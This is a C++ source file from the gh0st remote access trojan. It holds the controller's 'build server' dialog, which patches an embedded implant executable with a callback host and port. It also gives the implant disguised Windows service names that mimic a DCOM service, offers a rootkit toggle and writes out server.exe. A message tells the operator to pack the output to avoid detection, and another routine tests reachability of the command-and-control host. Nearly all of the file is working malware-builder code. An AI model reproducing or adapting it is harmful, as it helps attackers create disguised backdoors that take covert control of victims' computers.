// BuildServerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "BuildServerDlg.h"
#include "UpipDlg.h"
#include "encode.h"
#include "MainFrm.h"

#include "fixpe.h"

extern char* MyEncode(char *str);

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CMainFrame	*g_pFrame;
extern CIOCPServer	*m_iocpServer;

struct authreq
{
	char Ver;
	char Ulen;
	char NamePass[256];
};

struct authans
{
	char Ver;
	char Status;
};

struct DLL_INFO
{
	CHAR IdChar[32];
	CHAR LoginAddr[150];
	UINT LoginPort;
	char ServiceName[50];
	char Dllname[50];
	char ReMark[50];
	bool isRootkit;
} dll_info =
{
	"StartOfHostAndConfig",
	"127.0.0.1",		//127.0.0.1 192.168.1.145 lkyfire.vicp.net
	80,
	"SystemHelper",
	"System32.dll",
	"lx",
	false,
};

/////////////////////////////////////////////////////////////////////////////
// CBuildServerDlg dialog

CBuildServerDlg::CBuildServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CBuildServerDlg::IDD, pParent), m_listen_port(0), m_max_connections(1024), m_connect_auto(0)
{
	//{{AFX_DATA_INIT(CBuildServerDlg)
	m_url = _T("");
	m_enable_http = ((Cgh0stApp *)AfxGetApp())->m_IniFile.GetInt("Build", "enablehttp", false);
	m_bFirstShow = true;
	m_ServiceDescription = _T("管理已经加载的DOCM服务");
	m_ServiceDisplayName = _T("DcomLaunch Manager");
	m_servicename = _T("DCLAUCH");
	m_dllname = _T("123.dll");
	m_remote_host = ((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "Host", "");
	m_remote_port = ((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "Port", "808");
	m_bIsSaveAsDefault = FALSE;
	m_bIsRootkit = ((Cgh0stApp *)AfxGetApp())->m_IniFile.GetInt("Build", "IsRootkit", false);
	m_beizhu = _T("");
	//}}AFX_DATA_INIT
}

void CBuildServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuildServerDlg)
	DDX_Text(pDX, IDC_URL, m_url);
	DDX_Check(pDX, IDC_ENABLE_HTTP, m_enable_http);
	DDX_Text(pDX, IDC_SERVICE_DESCRIPTION, m_ServiceDescription);
	DDX_Text(pDX, IDC_SERVICE_DISPLAYNAME, m_ServiceDisplayName);
	DDX_Text(pDX, IDC_REMOTE_HOST, m_remote_host);
	DDX_Text(pDX, IDC_REMOTE_PORT, m_remote_port);

	DDX_Text(pDX, IDC_EDIT_DLLNAME, m_dllname);
	DDX_Text(pDX, IDC_Servive_Name, m_servicename);

	DDX_Text(pDX, IDC_BEIZHU, m_beizhu);

	DDX_Check(pDX, IDC_SAVEAS_DEFAULT, m_bIsSaveAsDefault);
	DDX_Check(pDX, IDC_Active_RootKit, m_bIsRootkit);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CBuildServerDlg, CDialogEx)
	//{{AFX_MSG_MAP(CBuildServerDlg)
	ON_BN_CLICKED(IDC_Up3322, OnUp3322)
	ON_BN_CLICKED(IDC_ENABLE_HTTP, OnEnableHttp)
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_TEST_MASTER, OnTestMaster)
	ON_BN_CLICKED(IDC_SAVEAS_DEFAULT, OnSaveasDefault)
	ON_BN_CLICKED(IDC_Active_RootKit, OnActiveRootKit)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuildServerDlg message handlers

BOOL CBuildServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	if (m_bFirstShow)
	{
		UpdateData(false);
		SetDlgItemText(IDC_URL, ((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "httpurl", "http://www.baidu.com/back.rmvb"));
		SetDlgItemText(IDC_SERVICE_DISPLAYNAME,
			((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "ServiceDisplayName", m_ServiceDisplayName));
		SetDlgItemText(IDC_SERVICE_DESCRIPTION,
			((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "ServiceDescription", m_ServiceDescription));

		SetDlgItemText(IDC_EDIT_DLLNAME,
			((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "DllName", m_dllname));
		SetDlgItemText(IDC_Servive_Name,
			((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "ServiceName", m_servicename));

		OnEnableHttp();
	}

	if (m_bFirstShow)
	{
		if (m_remote_host.GetLength() == 0)
		{
			char hostname[256];
			gethostname(hostname, sizeof(hostname));
			HOSTENT *host = gethostbyname(hostname);
			if (host != NULL)
				m_remote_host = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
			else
				m_remote_host = _T("192.168.101.1");
		}
		UpdateData(false);

		// 更新字串
		OnChangeConfig(0);
	}

	m_bFirstShow = false;
	return true;
}

void CBuildServerDlg::OnUp3322()
{
	CUpipDlg dlg(this);
	dlg.DoModal();
}

void CBuildServerDlg::OnEnableHttp()
{
	UpdateData(true);
	//	GetDlgItem(IDC_DNS_STRING)->EnableWindow(!m_enable_http);
	GetDlgItem(IDC_URL)->EnableWindow(m_enable_http);
	GetDlgItem(IDC_REMOTE_HOST)->EnableWindow(!m_enable_http);
	GetDlgItem(IDC_REMOTE_PORT)->EnableWindow(!m_enable_http);
}

int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSub)
{
	int da, j;
	if (isizeSub == 0)
		da = strlen(strSub);
	else
		da = isizeSub;
	for (int i = 0; i < iSizeMem; i++)
	{
		for (j = 0; j < da; j++)
			if (strMem[i + j] != strSub[j])
				break;
		if (j == da)
			return i;
	}

	return -1;
}

void CBuildServerDlg::OnBuild()
{
	UpdateData(true);
	if (m_ServiceDisplayName.IsEmpty() || m_ServiceDescription.IsEmpty())
	{
		AfxMessageBox(_T("请完整填写服务显示名称和描述 -:("));
		return;
	}

	// 保存配置
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "DllName", m_dllname);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceName", m_servicename);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceDisplayName", m_ServiceDisplayName);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceDescription", m_ServiceDescription);

	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetInt("Build", "EnableHttp", m_enable_http);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetInt("Build", "IsRootkit", m_bIsRootkit);

	CFileDialog dlg(FALSE, _T("exe"), _T("Ser.exe"), OFN_OVERWRITEPROMPT, _T("可执行文件|*.exe"), NULL);

	if (dlg.DoModal() != IDOK)
		return;

#ifdef _UNICODE
	char tempLoginAddr[MAX_PATH] = { 0 };

	char tempServiceName[MAX_PATH] = { 0 };
	char tempServiceDisplayName[MAX_PATH] = { 0 };
	char tempServiceDescription[MAX_PATH] = { 0 };
	char tempDllName[MAX_PATH] = { 0 };
	char tempBeizhu[MAX_PATH] = { 0 };

	WideCharToMultiByte(CP_ACP, 0, m_remote_host.GetBuffer(0), -1, tempLoginAddr, sizeof(tempLoginAddr) / sizeof(tempLoginAddr[0]), NULL, FALSE);

	WideCharToMultiByte(CP_ACP, 0, m_servicename.GetBuffer(0), -1, tempServiceName, sizeof(tempServiceName) / sizeof(tempServiceName[0]), NULL, FALSE);
	WideCharToMultiByte(CP_ACP, 0, m_ServiceDisplayName.GetBuffer(0), -1, tempServiceDisplayName, sizeof(tempServiceDisplayName) / sizeof(tempServiceDisplayName[0]), NULL, FALSE);
	WideCharToMultiByte(CP_ACP, 0, m_ServiceDescription.GetBuffer(0), -1, tempServiceDescription, sizeof(tempServiceDescription) / sizeof(tempServiceDescription[0]), NULL, FALSE);
	WideCharToMultiByte(CP_ACP, 0, m_dllname.GetBuffer(0), -1, tempDllName, sizeof(tempDllName) / sizeof(tempDllName[0]), NULL, FALSE);
	WideCharToMultiByte(CP_ACP, 0, m_beizhu.GetBuffer(0), -1, tempBeizhu, sizeof(tempBeizhu) / sizeof(tempBeizhu[0]), NULL, FALSE);

	TCHAR* str = m_url.GetBuffer(m_url.GetLength());
	//lstrcpyA(dll_info.LoginAddr, str);
	WideCharToMultiByte(CP_ACP, NULL, str, wcslen(str), dll_info.LoginAddr, 150, NULL, NULL);
	dll_info.LoginPort = 808;	//atoi((LPWSTR)m_remote_port);

	lstrcpyA(dll_info.ServiceName, tempServiceName);
	lstrcpyA(dll_info.Dllname, tempDllName);
#else
	lstrcpyA(dll_info.Dllname, m_dllname.GetBuffer(0));

	lstrcpyA(dll_info.LoginAddr, m_remote_host.GetBuffer(0));
	dll_info.LoginPort = atoi(m_remote_port.GetBuffer(0));
	lstrcpyA(dll_info.ServiceName, m_servicename.GetBuffer(0));
#endif
	///end
	//////////////////////////////////////////////////////////////////////////////////////

	HGLOBAL hResData;
	DWORD dwSize, dwWritten;
	LPBYTE p1;
	HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_MYEXE), _T("MYEXE"));
	if (hResInfo == NULL) return;

	dwSize = SizeofResource(NULL, hResInfo);
	// 装载资源
	hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL) return;
	// 为数据分配空间
	p1 = (LPBYTE)GlobalAlloc(GPTR, dwSize);
	if (p1 == NULL)     return;

	CopyMemory((LPVOID)p1, (LPCVOID)LockResource(hResData), dwSize);

	int iPos1 = MemFindStr((const char *)p1, "StartOfHostAndConfig", dwSize, lstrlenA("StartOfHostAndConfig"));

	CopyMemory((LPVOID)(p1 + iPos1), (LPCVOID)&dll_info, sizeof(DLL_INFO));

	TCHAR Path[256];
	GetCurrentDirectory(256, Path);
	lstrcat(Path, _T("\\server.exe"));
	DeleteFile(Path);
	HANDLE hFile = CreateFile(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == NULL) return;

	WriteFile(hFile, (LPVOID)p1, dwSize, &dwWritten, NULL);

	if (hFile) CloseHandle(hFile);
	if (p1) GlobalFree(p1);

	AfxMessageBox(_T("文件保存成功，请用加壳软件进行压缩"));
	OnOK();
}

void CBuildServerDlg::OnTestMaster()
{
	UpdateData();
	if (!m_remote_host.GetLength() || !m_remote_port.GetLength())
	{
		AfxMessageBox(_T("请完整填服务器信息"));
		return;
	}

	HANDLE	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster, this, 0, NULL);
	CloseHandle(hThread);
}

void CBuildServerDlg::OnSaveasDefault()
{
	OnChangeConfig(0);
}

void CBuildServerDlg::OnConnectAuto()
{
	UpdateData(true);
	GetDlgItem(IDC_CONNECT_MAX)->EnableWindow(!m_connect_auto);
}

DWORD WINAPI CBuildServerDlg::TestMaster(LPVOID lparam)
{
	CBuildServerDlg	*pThis = (CBuildServerDlg *)lparam;
	CString	strResult;
	bool	bRet = true;
	WSADATA	wsaData;
	WSAStartup(0x0201, &wsaData);

	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{
		AfxMessageBox(_T("socket 初始化失败"));
		return false;
	}
	// 设置socket为非阻塞
	u_long argp = 1;
	ioctlsocket(sRemote, FIONBIO, &argp);

	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;

#ifdef _UNICODE
	char myhost[MAX_PATH];
	wsprintfA(myhost, "%s", pThis->m_remote_host);
	hostent * pHostent = gethostbyname(myhost);
#else
	hostent * pHostent = gethostbyname(pThis->m_remote_host);
#endif
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}

	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
#ifdef _UNICODE
	char myport[10];
	wsprintfA(myport, "%s", pThis->m_remote_port);
	ClientAddr.sin_port = htons(atoi(myport));
#else
	ClientAddr.sin_port = htons(atoi(pThis->m_remote_port));
#endif

	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));

	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);

	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{
		bRet = false;
	}

fail:
	closesocket(sRemote);
	WSACleanup();

	if (bRet)
		strResult.Format(_T("成功打开到主机%s的连接， 在端口 %s: 连接成功"), pThis->m_remote_host, pThis->m_remote_port);
	else
		strResult.Format(_T("不能打开到主机%s的连接， 在端口 %s: 连接失败"), pThis->m_remote_host, pThis->m_remote_port);
	AfxMessageBox(strResult);
	return -1;
}
void CBuildServerDlg::OnChangeConfig(UINT id)
{
	UpdateData();
	UpdateData(FALSE);

	if (m_bIsSaveAsDefault)
	{
		((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "Host", m_remote_host);
		((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "Port", m_remote_port);

		((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "DllName", m_dllname);
		((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceName", m_servicename);
		((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceDisplayName", m_ServiceDisplayName);
		((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceDescription", m_ServiceDescription);

		((Cgh0stApp *)AfxGetApp())->m_IniFile.SetInt("Build", "enablehttp", m_enable_http);
		((Cgh0stApp *)AfxGetApp())->m_IniFile.SetInt("Build", "IsRootkit", m_bIsRootkit);
	}
}

void CBuildServerDlg::OnActiveRootKit()
{
	UpdateData(true);
}